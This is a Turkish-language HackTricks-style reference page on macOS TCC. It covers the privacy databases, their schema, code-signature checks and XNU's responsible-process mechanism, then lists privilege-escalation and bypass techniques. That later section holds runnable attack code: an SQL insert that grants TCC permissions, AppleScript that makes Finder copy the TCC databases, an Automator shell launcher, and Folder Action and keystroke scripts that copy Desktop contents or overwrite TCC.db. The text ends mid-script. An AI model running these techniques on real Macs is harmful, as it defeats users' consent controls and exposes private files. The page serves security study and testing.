# macOS TCC

{{#include ../../../../banners/hacktricks-training.md}}

## **Temel Bilgiler**

**TCC (Transparency, Consent, and Control)**, uygulama izinlerini düzenlemeye odaklanan bir güvenlik protokolüdür. Temel amacı **konum servisleri, kişiler, fotoğraflar, mikrofon, kamera, erişilebilirlik ve tam disk erişimi** gibi hassas özellikleri korumaktır. Uygulamalara bu özelliklere erişim izni vermeden önce açık kullanıcı onayı alınmasını zorunlu kılarak TCC, gizliliği ve kullanıcıların verileri üzerindeki kontrolünü artırır.

Uygulamalar korumalı özelliklere erişim istediğinde kullanıcılar TCC ile karşılaşır. Bu, kullanıcıların **erişimi onaylamasına veya reddetmesine** olanak tanıyan bir istem aracılığıyla görünür. Ayrıca TCC, belirli dosyalara erişim izni vermek için **dosyaları bir uygulamaya sürükleyip bırakma** gibi doğrudan kullanıcı eylemlerini de destekler. Böylece uygulamalar yalnızca açıkça izin verilen öğelere erişebilir.

![An example of a TCC prompt](https://rainforest.engineering/images/posts/macos-tcc/tcc-prompt.png?1620047855)

**TCC**, `/System/Library/PrivateFrameworks/TCC.framework/Support/tccd` konumundaki **daemon** tarafından yönetilir ve `/System/Library/LaunchDaemons/com.apple.tccd.system.plist` dosyasında yapılandırılır (mach servisi `com.apple.tccd.system` kaydedilir).

Giriş yapmış her kullanıcı için çalışan bir **kullanıcı modu tccd** bulunur. Bu süreç, `/System/Library/LaunchAgents/com.apple.tccd.plist` dosyasında tanımlanır ve `com.apple.tccd` ile `com.apple.usernotifications.delegate.com.apple.tccd` mach servislerini kaydeder.

Burada tccd'nin sistem ve kullanıcı olarak çalıştığını görebilirsiniz:

```bash
ps -ef | grep tcc
    0   374     1   0 Thu07PM ??         2:01.66 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd system
  501 63079     1   0  6:59PM ??         0:01.95 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd
```

İzinler **üst uygulamadan devralınır** ve **izinler**, **Bundle ID** ile **Developer ID** temel alınarak **izlenir**.

### TCC Veritabanları

İzinler/retler daha sonra bazı TCC veritabanlarında saklanır:

- Sistem genelindeki veritabanı: **`/Library/Application Support/com.apple.TCC/TCC.db`**.
  - Bu veritabanı **SIP tarafından korunur**, bu nedenle yalnızca bir SIP bypass işlemi buraya yazabilir.
- Kullanıcı başına tercihler için kullanıcı TCC veritabanı **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**.
  - Bu veritabanı korunur; bu nedenle yalnızca Full Disk Access gibi yüksek TCC ayrıcalıklarına sahip işlemler buraya yazabilir (ancak SIP tarafından korunmaz).

> [!WARNING]
> Önceki veritabanları, **okuma erişimine karşı da TCC tarafından korunur**. Bu nedenle, TCC ayrıcalıklı bir işlemden erişmediğiniz sürece normal kullanıcı TCC veritabanınızı **okuyamazsınız**.
>
> Ancak bu yüksek ayrıcalıklara sahip bir işlemin (ör. **FDA** veya **`kTCCServiceEndpointSecurityClient`**) kullanıcı TCC veritabanına yazabileceğini unutmayın.

- **Konum servislerine** **erişmesine** izin verilen istemcileri belirtmek için **`/var/db/locationd/clients.plist`** konumunda **üçüncü** bir TCC veritabanı bulunur.
- **`/Library/Application Support/com.apple.TCC/REG.db`**, kayıtlı TCC veritabanı yollarını içerir. Ekilmiş bir kullanıcı veritabanı, kayıtlı değilse reddedilebilir; yalnızca bu yolu bilmek iki veritabanından herhangi birine erişim sağlamaz.<sup>[[6]](#references)</sup>
- **`/Library/Application Support/com.apple.TCC/MDMOverrides.plist`**, yönetilen Privacy Preferences Policy Control (PPPC) kararlarını içerir. Bir uygulamada, sıradan `access` satırlarında bulunmayan yönetilen bir izin varsa bu dosyayı kontrol edin.<sup>[[7]](#references)</sup>
- SIP tarafından korunan **`/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist`** dosyası (ancak herkes tarafından okunabilir), TCC istisnası gerektiren uygulamaların izin listesidir.

> [!TIP]
> **iOS** üzerindeki TCC veritabanı **`/private/var/mobile/Library/TCC/TCC.db`** konumundadır.

> [!TIP]
> **Bildirim Merkezi arayüzü**, **sistem TCC veritabanında değişiklikler** yapabilir:
>
> ```bash
> codesign -dv --entitlements :- /System/Library/PrivateFrameworks/TCC.framework/> Support/tccd
> [..]
> com.apple.private.tcc.manager
> com.apple.rootless.storage.TCC
> ```
> Ancak kullanıcılar **`tccutil`** komut satırı aracını kullanarak **kuralları sıfırlayabilir**; belgelenmiş bir sorgulama işlemi yoktur.<sup>[[4]](#references)</sup>

#### Veritabanlarını sorgulama

{{#tabs}}
{{#tab name="user DB"}}

```bash
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```

{{#endtab}}

{{#tab name="system DB"}}

```bash
sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Get all FDA
sqlite> select service, client, auth_value, auth_reason from access where service = "kTCCServiceSystemPolicyAllFiles" and auth_value=2;

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```

{{#endtab}}
{{#endtabs}}

> [!TIP]
> Her iki veritabanını da kontrol ederek bir uygulamanın izin verdiği, reddettiği veya henüz sahip olmadığı (uygulama bunu isteyecektir) izinleri görebilirsiniz.

- **`service`**, TCC **izin** dizesinin gösterimidir
- **`client`**, izinlere sahip **bundle ID** veya **binary dosyasının yolu**dur
- **`client_type`**, bunun bir Bundle Identifier(0) mı yoksa mutlak bir yol(1) mı olduğunu belirtir

<details>

<summary>Mutlak bir yol söz konusuysa nasıl çalıştırılır?</summary>

Şunun gibi bir plist ile **`launctl load you_bin.plist`** komutunu çalıştırmanız yeterlidir:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <!-- Label for the job -->
    <key>Label</key>
    <string>com.example.yourbinary</string>

    <!-- The path to the executable -->
    <key>Program</key>
    <string>/path/to/binary</string>

    <!-- Arguments to pass to the executable (if any) -->
    <key>ProgramArguments</key>
    <array>
        <string>arg1</string>
        <string>arg2</string>
    </array>

    <!-- Run at load -->
    <key>RunAtLoad</key>
    <true/>

    <!-- Keep the job alive, restart if necessary -->
    <key>KeepAlive</key>
    <true/>

    <!-- Standard output and error paths (optional) -->
    <key>StandardOutPath</key>
    <string>/tmp/YourBinary.stdout</string>
    <key>StandardErrorPath</key>
    <string>/tmp/YourBinary.stderr</string>
</dict>
</plist>
```

</details>

- **`auth_value`** farklı değerler alabilir: denied(0), unknown(1), allowed(2) veya limited(3).
- **`auth_reason`** şu değerleri alabilir: Error(1), User Consent(2), User Set(3), System Set(4), Service Policy(5), MDM Policy(6), Override Policy(7), Missing usage string(8), Prompt Timeout(9), Preflight Unknown(10), Entitled(11), App Type Policy(12)
- **csreq** alanı, çalıştırılacak binary'nin nasıl doğrulanacağını ve TCC izinlerinin nasıl verileceğini belirtir:

```bash
# Query to get cserq in printable hex
select service, client, hex(csreq) from access where auth_value=2;

# To decode it (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
BLOB="FADE0C000000003000000001000000060000000200000012636F6D2E6170706C652E5465726D696E616C000000000003"
echo "$BLOB" | xxd -r -p > terminal-csreq.bin
csreq -r- -t < terminal-csreq.bin

# To create a new one (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
REQ_STR=$(codesign -d -r- /Applications/Utilities/Terminal.app/ 2>&1 | awk -F ' => ' '/designated/{print $2}')
echo "$REQ_STR" | csreq -r- -b /tmp/csreq.bin
REQ_HEX=$(xxd -p /tmp/csreq.bin  | tr -d '\n')
echo "X'$REQ_HEX'"
```

- Tablonun **diğer alanları** hakkında daha fazla bilgi için [**bu blog yazısına göz atın**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive).<sup>[[1]](#references)</sup>

`System Preferences --> Security & Privacy --> Privacy --> Files and Folders` bölümünden uygulamalara **önceden verilmiş izinleri** de kontrol edebilirsiniz.

> [!TIP]
> Kullanıcılar kuralları **`tccutil`** kullanarak **sıfırlayabilir**, ancak izinleri sorgulamak için veritabanlarını incelemeleri gerekir.<sup>[[4]](#references)</sup>

#### TCC izinlerini sıfırlama

```bash
# You can reset all the permissions given to an application with
tccutil reset All app.some.id

# Reset the permissions granted to all apps
tccutil reset All
```

#### Apple Events gönderen ve hedef izinlerini belirleme

Bir Automation izni, her uygulamayı kontrol etme izni değil, **gönderenden hedefe** yönelik bir karardır. Kullanıcı veritabanına erişiminiz varsa, aşağıdaki [Apple Events](macos-apple-events.md) veya Finder iş akışlarını denemeden önce izin verilen gönderen/hedef çiftlerini listeleyin. `csreq` göndereni, `indirect_object_code_identity` ise hedefi tanımlar; null olmayan bu blob'lardan herhangi birini yukarıdaki `csreq` yöntemiyle çözümleyin.<sup>[[1]](#references)</sup>

```bash
sqlite3 "$HOME/Library/Application Support/com.apple.TCC/TCC.db" \
  "SELECT client, indirect_object_identifier AS target, \
          hex(csreq) AS sender_req, \
          hex(indirect_object_code_identity) AS target_req \
   FROM access WHERE service='kTCCServiceAppleEvents' AND auth_value=2;"
```

### TCC İmza Kontrolleri

TCC **veritabanı**, uygulamanın **Bundle ID**'sini **saklar**; ayrıca izin kullanmayı talep eden **uygulamanın** doğru uygulama olduğundan **emin olmak** için **imza** hakkında **bilgiler** de **saklar**.

```bash
# From sqlite
sqlite> select service, client, hex(csreq) from access where auth_value=2;
#Get csreq

# From bash
echo FADE0C00000000CC000000010000000600000007000000060000000F0000000E000000000000000A2A864886F763640601090000000000000000000600000006000000060000000F0000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A364E33385657533542580000000000020000001572752E6B656570636F6465722E54656C656772616D000000 | xxd -r -p - > /tmp/telegram_csreq.bin
## Get signature checks
csreq -t -r /tmp/telegram_csreq.bin
(anchor apple generic and certificate leaf[field.1.2.840.113635.100.6.1.9] /* exists */ or anchor apple generic and certificate 1[field.1.2.840.113635.100.6.2.6] /* exists */ and certificate leaf[field.1.2.840.113635.100.6.1.13] /* exists */ and certificate leaf[subject.OU] = "6N38VWS5BX") and identifier "ru.keepcoder.Telegram"
```

> [!WARNING]
> Bu nedenle, aynı adı ve bundle ID'yi kullanan diğer uygulamalar, başka uygulamalara verilen izinlere erişemez.

### Entitlements ve TCC İzinleri

Bir TCC izni, **App Sandbox** kısıtlamalarını geçersiz kılmaz. Sandbox içindeki bir kamera istemcisinin `com.apple.security.device.camera` entitlement'ına ihtiyacı vardır; Apple bu yeteneği Hardened Runtime uygulamaları için de sunar. Bu entitlement'ların hiçbiri, kullanıcıdan ayrıca izin isteyen istemi atlamaz. Sandbox entitlement'ını, sandbox dışında çalışan her süreç için koşulsuz bir ön koşul olarak değerlendirmeyin. Bir istek başarısız olduğunda hem yürütülebilir dosyanın entitlement'larını hem de sorumlu uygulamayı kontrol edin.<sup>[[8]](#references)[[9]](#references)</sup>

Entitlement'ların plist dosyaları olduğunu ve code signature'ın bir parçası olduklarını unutmayın. Bunlar, code signature içinde özel slotlarla ek olarak hash'lenir ve kernel kodu tarafından kernel'de veya `csops(#169)` ya da `csops_audittoken(#170)` kullanılarak user mode kodu tarafından sorgulanabilir.

Ancak uygulamaların `~/Desktop`, `~/Downloads` ve `~/Documents` gibi **belirli kullanıcı klasörlerine** **erişmek** için belirli bir **entitlement'a** sahip olmaları **gerekmez**. Sistem erişimi şeffaf biçimde yönetir ve gerektiğinde **kullanıcıdan izin ister**.

- [https://newosxbook.com/ent.php](https://newosxbook.com/ent.php)

Apple uygulamaları **izin istemleri oluşturmaz**. Bu uygulamaların **entitlements** listesinde **önceden verilmiş haklar** bulunur; bu nedenle **hiçbir zaman açılır pencere oluşturmazlar** ve **TCC veritabanlarında da görünmezler**. Örneğin:

```bash
codesign -dv --entitlements :- /System/Applications/Calendar.app
[...]
<key>com.apple.private.tcc.allow</key>
<array>
    <string>kTCCServiceReminders</string>
    <string>kTCCServiceCalendar</string>
    <string>kTCCServiceAddressBook</string>
</array>
```

This, Calendar'ın kullanıcıdan reminders, calendar ve address book'a erişim izni istemesini önler.

> [!TIP]
> Entitlements hakkında bazı resmi belgelerin yanı sıra, **entitlements hakkında ilginç bilgiler** [**https://newosxbook.com/ent.jl**](https://newosxbook.com/ent.jl) adresinde resmi olmayan kaynaklarda da bulunabilir.

Bazı TCC izinleri şunlardır: kTCCServiceAppleEvents, kTCCServiceCalendar, kTCCServicePhotos... Bunların tümünü tanımlayan herkese açık bir liste yok, ancak [**bilinenlerin listesini**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive#service) inceleyebilirsiniz.<sup>[[1]](#references)</sup>

### Hassas, korumasız konumlar

- $HOME (kendisi)
- $HOME/.ssh, $HOME/.aws vb.
- /tmp

### Kullanıcı Amacı / com.apple.macl

Daha önce belirtildiği gibi, **bir dosyayı sürükleyip App'in üzerine bırakarak App'e dosyaya erişim izni vermek** mümkündür. Bu erişim hiçbir TCC veritabanında belirtilmez; bunun yerine dosyanın **extended attribute**'u olarak kaydedilir. Bu attribute, izin verilen App'in UUID'sini **saklar**:<sup>[[2]](#references)</sup>

```bash
xattr Desktop/private.txt
com.apple.macl

# Check extra access to the file
## Script from https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command
macl_read Desktop/private.txt
Filename,Header,App UUID
"Desktop/private.txt",0300,769FD8F1-90E0-3206-808C-A8947BEBD6C3

# Get the UUID of the app
otool -l /System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal| grep uuid
    uuid 769FD8F1-90E0-3206-808C-A8947BEBD6C3
```

> [!TIP]
> İlginçtir ki **`com.apple.macl`** niteliği tccd tarafından değil, **Sandbox** tarafından yönetilir.
>
> Ayrıca, bilgisayarınızdaki bir uygulamanın UUID'sine izin veren bir dosyayı başka bir bilgisayara taşırsanız, aynı uygulamanın farklı UID'leri olacağından bu dosyanın o uygulamaya erişim izni vermeyeceğini unutmayın.

`com.apple.macl` genişletilmiş niteliği, **SIP tarafından korunduğu** için diğer genişletilmiş nitelikler gibi **temizlenemez**. Ancak [**bu yazıda açıklandığı gibi**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/), dosyayı **zip'leyip**, **silip** ardından **zip'ten çıkararak** devre dışı bırakmak mümkündür.<sup>[[3]](#references)</sup>






## XNU Sorumlu İşlem Mekanizması

macOS/iOS'te **sorumlu işlem** mekanizması, **TCC (Transparency, Consent, and Control)** çerçevesi ve diğer güvenlik sistemleri tarafından, alt süreç zincirleri boyunca dahi bir eylemden nihai olarak hangi sürecin sorumlu olduğunu izlemek için kullanılan kritik bir güvenlik özelliğidir.

TCC izinleri denetlerken (ör. kamera, mikrofon, konum), isteği yapan doğrudan süreci her zaman denetlemez. Bunun yerine **sorumlu işlemi** denetler. Bu genellikle eylemi başlatan GUI uygulamasıdır; gerçek istek bir yardımcı süreç veya daemon tarafından yapılsa bile.

Bir isteğe gerçekten atfedilen uygulamayı belirlemek için korumalı işlemi başlatırken TCC'nin `AttributionChain` mesajlarını akış olarak izleyin. Bu, API çağrısını yaptığı için yardımcı yürütülebilir dosyaya izin vermekten daha güvenilirdir. Bildirilen kimliği, ilgili `access` satırındaki bundle ID veya yol ve imzalama gereksinimiyle karşılaştırın.<sup>[[10]](#references)</sup>

```bash
log stream --debug --predicate 'subsystem == "com.apple.TCC" AND eventMessage BEGINSWITH "AttributionChain"'
```

<details>
<summary>Sorumlu Süreç Nasıl Ayarlanır</summary>

### Süreç Yapısı Alanları

XNU'daki her süreç iki önemli UUID tanımlayıcısını tutar:

```c
// From bsd/sys/proc_internal.h
struct proc {
    // ...
    pid_t   p_responsible_pid;          // PID of the responsible process
    uint8_t p_uuid[16];                 // UUID from LC_UUID load command (self)
    uint8_t p_responsible_uuid[16];     // UUID of pid responsible for this process
    // ...
};
```

- **`p_uuid`**: Sürecin kendi UUID'si (Mach-O binary'sindeki `LC_UUID` load command'ından alınır)
- **`p_responsible_pid`**: Sorumlu sürecin PID'si
- **`p_responsible_uuid`**: Sorumlu sürecin UUID'si (süreç sonlandıktan sonra da korunur)

### Sorumlu Süreç Nasıl Belirlenir?

1. **Süreç Oluşturulurken (Fork)**

`fork()` veya `posix_spawn()` aracılığıyla yeni bir süreç oluşturulduğunda, sorumlu süreç üst süreçten devralınır (`exec()` syscall'ı mevcut `proc` yapısını yeniden kullandığından bu adım burada tekrarlanmaz):

**Konum**: `bsd/kern/kern_fork.c:1053`

```c
// In fork1_internal() - called during all process creation
proc_set_responsible_pid(child_proc, parent_proc->p_responsible_pid);
```

**Ana Noktalar:**
- Alt süreçler, üst sürecin `p_responsible_pid` değerini **devralır**
- Bu, süreç hiyerarşisi boyunca bir **sorumluluk zinciri** oluşturur
- Sorumlu süreç genellikle özgün GUI uygulamasını gösterir

2. **Temel Fonksiyon: `proc_set_responsible_pid()`**

**Konum**: `bsd/kern/kern_proc.c:4817-4831`

```c
void
proc_set_responsible_pid(proc_t target_proc, pid_t responsible_pid)
{
    target_proc->p_responsible_pid = responsible_pid;
    
    if (responsible_pid >= 0) {
        proc_t responsible_proc = proc_find(responsible_pid);
        if (responsible_proc != PROC_NULL) {
            // Copy the responsible process's UUID for persistent identification
            proc_getexecutableuuid(responsible_proc, 
                target_proc->p_responsible_uuid, 
                sizeof(target_proc->p_responsible_uuid));
            proc_rele(responsible_proc);
        }
    }
    return;
}
```

**Bu işlevin yaptığı:**
1. Hedef süreçte **sorumlu PID'yi ayarlar**
2. `proc_find()` kullanarak **sorumlu süreci arar** (referans sayısını artırır)
3. Sorumlu sürecin `p_uuid` değerindeki UUID'yi hedef sürecin `p_responsible_uuid` değerine **kopyalar**
4. `proc_rele()` ile **referansı serbest bırakır** (referans sayısını azaltır)

3. **Neden Hem PID Hem UUID Saklanıyor?**

İkili depolama yaklaşımı kritik bir sorunu çözer:

| Alan | Amaç | Sorun | Çözüm |
|-------|---------|----------|----------|
| `p_responsible_pid` | Geçerli süreci hızlıca arama | Süreç sonlandıktan sonra PID yeniden kullanılabilir | Etkin süreç araması için kullanılır |
| `p_responsible_uuid` | Kalıcı tanımlama | Süreç sonlandıktan sonra da geçerliliğini korur | Güvenlik kontrolleri ve denetim için kullanılır |

**Sorun**: Sorumlu süreç alt süreçten önce sonlanırsa PID geri dönüştürülüp tamamen farklı bir sürece atanabilir.

**Çözüm**: UUID değişmezdir ve sorumlu olan belirli binary'yi, süreç sonlandıktan sonra bile benzersiz şekilde tanımlar.

### Süreç Oluşturma Akışı

```
┌─────────────────────────────────────────────────────────────┐
│ Parent Process (e.g., Safari)                               │
│ p_uuid: A155B8BB-7F2C-3EBA-AE7D-60A1F2CDEF81              │
│ p_responsible_pid: 1234 (points to itself)                 │
│ p_responsible_uuid: A155B8BB-7F2C-3EBA-AE7D-60A1F2CDEF81  │
└─────────────────────┬───────────────────────────────────────┘
                      │
                      │ fork() / posix_spawn()
                      ▼
         ┌────────────────────────────┐
         │ kern_fork.c:fork1_internal │
         │                            │
         │ proc_set_responsible_pid(  │
         │   child_proc,              │
         │   parent->p_responsible_pid│
         │ );                         │
         └────────────┬───────────────┘
                      │
                      ▼
         ┌────────────────────────────┐
         │ proc_set_responsible_pid() │
         │                            │
         │ 1. Set p_responsible_pid   │
         │ 2. Find responsible proc   │
         │ 3. Copy UUID               │
         │ 4. Release reference       │
         └────────────┬───────────────┘
                      │
                      ▼
┌─────────────────────────────────────────────────────────────┐
│ Child Process (e.g., SafariHelper)                          │
│ p_uuid: B266C9DD-8E3F-4AAA-9F1E-71D2E3CDEF82              │
│ p_responsible_pid: 1234 (inherited from parent)            │
│ p_responsible_uuid: A155B8BB-7F2C-3EBA-AE7D-60A1F2CDEF81  │
│                     (copied from Safari)                    │
└─────────────────────────────────────────────────────────────┘
```

### UUID Kaynağı: LC_UUID Load Command

`p_uuid` içinde saklanan UUID, **Mach-O executable'ın `LC_UUID` load command'inden** gelir:

1. **Derleme Zamanı**

```bash
# When linking, the linker (ld) generates a unique UUID
$ ld -o myapp myapp.o
# Embedded in the Mach-O binary as LC_UUID load command
```

2. **Çalıştırma Zamanı**

**Location**: `bsd/kern/mach_loader.c:2393-2413`

```c
static load_return_t
load_uuid(struct uuid_command *uulp, char *command_end, load_result_t *result)
{
    if ((uulp->cmdsize < sizeof(struct uuid_command)) ||
        (((char *)uulp + sizeof(struct uuid_command)) > command_end)) {
        return LOAD_BADMACHO;
    }

    // Extract UUID from LC_UUID load command
    memcpy(&result->uuid[0], &uulp->uuid[0], sizeof(result->uuid));
    return LOAD_SUCCESS;
}
```

3. **Süreç Yapısında Saklanır**

**Konum**: `bsd/kern/kern_exec.c:2281`

```c
// After loading the Mach-O binary during exec()
proc_setexecutableuuid(p, &load_result.uuid[0]);
```

**Konum**: `bsd/kern/kern_proc.c:1912-1915`

```c
void
proc_setexecutableuuid(proc_t p, const unsigned char *uuid)
{
    memcpy(p->p_uuid, uuid, sizeof(p->p_uuid));
}
```
</details>


## TCC Privesc & Bypasses

### TCC'ye Ekle

Bir noktada bir TCC veritabanına yazma erişimi elde ederseniz, bir kayıt eklemek için aşağıdakine benzer bir şey kullanabilirsiniz (yorumları kaldırın):

<details>

<summary>TCC'ye Ekleme Örneği</summary>

```sql
INSERT INTO access (
    service,
    client,
    client_type,
    auth_value,
    auth_reason,
    auth_version,
    csreq,
    policy_id,
    indirect_object_identifier_type,
    indirect_object_identifier,
    indirect_object_code_identity,
    flags,
    last_modified,
    pid,
    pid_version,
    boot_uuid,
    last_reminded
) VALUES (
    'kTCCServiceSystemPolicyDesktopFolder', -- service
    'com.googlecode.iterm2', -- client
    0, -- client_type (0 - bundle id)
    2, -- auth_value  (2 - allowed)
    3, -- auth_reason (3 - "User Set")
    1, -- auth_version (always 1)
    X'FADE0C00000000C40000000100000006000000060000000F0000000200000015636F6D2E676F6F676C65636F64652E697465726D32000000000000070000000E000000000000000A2A864886F7636406010900000000000000000006000000060000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A483756375859565137440000', -- csreq is a BLOB, set to NULL for now
    NULL, -- policy_id
    NULL, -- indirect_object_identifier_type
    'UNUSED', -- indirect_object_identifier - default value
    NULL, -- indirect_object_code_identity
    0, -- flags
    strftime('%s', 'now'), -- last_modified with default current timestamp
    NULL, -- assuming pid is an integer and optional
    NULL, -- assuming pid_version is an integer and optional
    'UNUSED', -- default value for boot_uuid
    strftime('%s', 'now') -- last_reminded with default current timestamp
);
```

</details>

### TCC Payloads

Bir uygulamaya girip bazı TCC izinleri aldıysanız, bunları kötüye kullanmak için TCC payload'larının bulunduğu şu sayfaya bakın:


{{#ref}}
macos-tcc-payloads.md
{{#endref}}

### Apple Events

Apple Events hakkında bilgi edinmek için:


{{#ref}}
macos-apple-events.md
{{#endref}}

### Automation (Finder) to FDA\*

Automation izninin TCC adı: **`kTCCServiceAppleEvents`**\
Bu özel TCC izni, TCC veritabanında **yönetilebilecek uygulamayı** da belirtir (yani izin, her şeyi yönetmeye olanak tanımaz).

**Finder**, **her zaman FDA'ya sahip** bir uygulamadır (UI'da görünmese bile); bu nedenle üzerinde **Automation** ayrıcalıklarına sahipseniz, bazı işlemleri **yaptırarak** bu ayrıcalıkları kötüye kullanabilirsiniz.\
Bu durumda uygulamanızın **`com.apple.Finder`** üzerinde **`kTCCServiceAppleEvents`** iznine ihtiyacı olur.<sup>[[4]](#references)</sup>

{{#tabs}}
{{#tab name="Steal users TCC.db"}}

```applescript
# This AppleScript will copy the system TCC database into /tmp
osascript<<EOD
tell application "Finder"
    set homeFolder to path to home folder as string
    set sourceFile to (homeFolder & "Library:Application Support:com.apple.TCC:TCC.db") as alias
    set targetFolder to POSIX file "/tmp" as alias
    duplicate file sourceFile to targetFolder with replacing
end tell
EOD
```

{{#endtab}}

{{#tab name="Steal systems TCC.db"}}

```applescript
osascript<<EOD
tell application "Finder"
    set sourceFile to POSIX file "/Library/Application Support/com.apple.TCC/TCC.db" as alias
    set targetFolder to POSIX file "/tmp" as alias
    duplicate file sourceFile to targetFolder with replacing
end tell
EOD
```

{{#endtab}}
{{#endtabs}}

Rapor edilen bir yazma varyantında, Finder'a giden bir Automation yolu mevcutsa Finder'a kullanıcının **`com.apple.TCC` dizinini yeniden adlandırması** söylenir. Yeniden adlandırılan yoldaki veritabanı daha sonra bir hazırlık dizinine kopyalanır, burada değiştirilir, geri kopyalanır ve dizin adı eski haline getirilir. Yeni `kTCCServiceAppleEvents` satırı, kod gereksinimleri de dahil olmak üzere **hem gönderen binary'yi hem de Finder'ı** tanımlamalıdır; hedef kimliği olmadan gönderene izin vermek aynı şey değildir. Bu, yola bağlı bir tekniktir; yalnızca Finder Automation'ın rastgele veritabanı yazma izinleri verdiğini varsaymak yerine hedef macOS sürümünde doğrulayın.<sup>[[11]](#references)</sup>

> [!WARNING]
> Bu izinle **Finder'dan TCC ile kısıtlanmış klasörlere erişmesini** ve dosyaları size vermesini isteyebilirsiniz; ancak bildiğim kadarıyla, Finder'ın FDA erişimini tamamen kötüye kullanmak için ona **rastgele kod çalıştırtamazsınız**.
>
> Bu nedenle, FDA'nın tüm yeteneklerini kötüye kullanamazsınız.

Finder üzerinde Automation ayrıcalıkları almak için TCC istemi şöyledir:

<figure><img src="../../../../images/image (27).png" alt="" width="244"><figcaption></figcaption></figure>

> [!CAUTION]
> **Automator** uygulaması TCC izni **`kTCCServiceAppleEvents`** sahibi olduğundan Finder gibi herhangi bir uygulamayı **kontrol edebileceğini** unutmayın. Bu nedenle Automator'ı kontrol etme iznine sahipseniz, aşağıdaki gibi bir kodla **Finder'ı** da kontrol edebilirsiniz:

<details>

<summary>Automator içinde bir shell edinme</summary>

```applescript
osascript<<EOD
set theScript to "touch /tmp/something"

tell application "Automator"
   set actionID to Automator action id "com.apple.RunShellScript"
   tell (make new workflow)
      add actionID to it
      tell last Automator action
         set value of setting "inputMethod" to 1
         set value of setting "COMMAND_STRING" to theScript
      end tell
      execute it
   end tell
   activate
end tell
EOD
# Once inside the shell you can use the previous code to make Finder copy the TCC databases for example and not TCC prompt will appear
```

</details>

**Script Editor app için de aynısı geçerlidir:** Finder'ı kontrol edebilir, ancak bir AppleScript kullanarak ona bir script çalıştırmasını zorlayamazsınız.

### Bazı TCC'lere yönelik Automation (SE)

**System Events, Folder Actions oluşturabilir ve Folder Actions bazı TCC klasörlerine (Desktop, Documents ve Downloads) erişebilir.** Bu nedenle aşağıdaki gibi bir script, bu davranıştan yararlanmak için kullanılabilir:

```bash
# Create script to execute with the action
cat > "/tmp/script.js" <<EOD
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("cp -r $HOME/Desktop /tmp/desktop");
EOD

osacompile -l JavaScript -o "$HOME/Library/Scripts/Folder Action Scripts/script.scpt" "/tmp/script.js"

# Create folder action with System Events in "$HOME/Desktop"
osascript <<EOD
tell application "System Events"
    -- Ensure Folder Actions are enabled
    set folder actions enabled to true

    -- Define the path to the folder and the script
    set homeFolder to path to home folder as text
    set folderPath to homeFolder & "Desktop"
    set scriptPath to homeFolder & "Library:Scripts:Folder Action Scripts:script.scpt"

    -- Create or get the Folder Action for the Desktop
    if not (exists folder action folderPath) then
        make new folder action at end of folder actions with properties {name:folderPath, path:folderPath}
    end if
    set myFolderAction to folder action folderPath

    -- Attach the script to the Folder Action
    if not (exists script scriptPath of myFolderAction) then
        make new script at end of scripts of myFolderAction with properties {name:scriptPath, path:scriptPath}
    end if

    -- Enable the Folder Action and the script
    enable myFolderAction
end tell
EOD

# File operations in the folder should trigger the Folder Action
touch "$HOME/Desktop/file"
rm "$HOME/Desktop/file"
```

### Automation (SE) + Accessibility (**`kTCCServicePostEvent`|**`kTCCServiceAccessibility`**) ile FDA\*

**`System Events`** üzerindeki Automation + Accessibility (**`kTCCServicePostEvent`**), **process'lere tuş vuruşları göndermeye** olanak tanır. Bu şekilde Finder'ı kötüye kullanarak kullanıcının TCC.db dosyasını değiştirebilir veya rastgele bir app'e FDA verebilirsiniz (ancak bunun için parola istenebilir).

Finder kullanarak kullanıcının TCC.db dosyasını üzerine yazma örneği:

```applescript
-- store the TCC.db file to copy in /tmp
osascript <<EOF
tell application "System Events"
    -- Open Finder
    tell application "Finder" to activate

    -- Open the /tmp directory
    keystroke "g" using {command down, shift down}
    delay 1
    keystroke "/tmp"
    delay 1
    keystroke return
    delay 1

    -- Select and copy the file
    keystroke "TCC.db"
    delay 1
    keystroke "c" using {command down}
    delay 1

    -- Resolve $HOME environment variable
